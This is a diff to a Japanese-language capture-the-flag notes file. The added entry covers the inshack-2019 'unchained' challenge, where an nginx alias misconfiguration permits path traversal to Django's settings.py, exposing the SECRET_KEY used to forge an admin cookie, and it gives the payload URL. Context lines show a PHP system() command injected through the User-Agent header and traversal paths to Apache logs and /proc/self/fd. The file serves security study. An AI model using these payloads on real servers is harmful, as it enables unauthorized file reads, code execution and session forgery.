@@ -244,9 +244,26 @@ User-Agent: <?php system('ls /var/www/html/');?>
 `/R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log`  
 または  
 `/R3M3MB3R/index.php?f=/proc/self/fd/7`  
-## 
+## nginx.conf alias traversal / get SECRET_KEY from Django's settings.py (inshack-2019 unchained)
+https://github.com/InsecurityAsso/inshack-2019/blob/master/unchained/writeup.md  
 - **entrypoint**  
+よくわからんけど多分Cookieの値を`"admin"`で署名しないとFlagが取れない的なヒントが書かれていて、いろんなファイルが配布されている。  
+`nginx.conf`が以下のように`location /static {`で`/static/`のように後ろの`/`を付け忘れているのが脆弱。  
+```txt
+# static files
+location /static {
+    alias /srv/app/static/;
+}
+```
+後ろでDjangoが動いていることがわかるので、DjangoのファイルをPath Traversalで読み取って署名に使うSECRET_KEYをゲットすれば、セッションを任意の値にセットできる！  
+```txt
+https://unchained.ctf.insecurity-insa.fr/static../unchained/settings.py
+```
+これでSECRET_KEYをゲットしてCookieを改竄すればFlagゲット？？  
 - **payload**  
+```txt
+https://unchained.ctf.insecurity-insa.fr/static../unchained/settings.py
+```
 ## 
 - **entrypoint**  
 - **payload**  
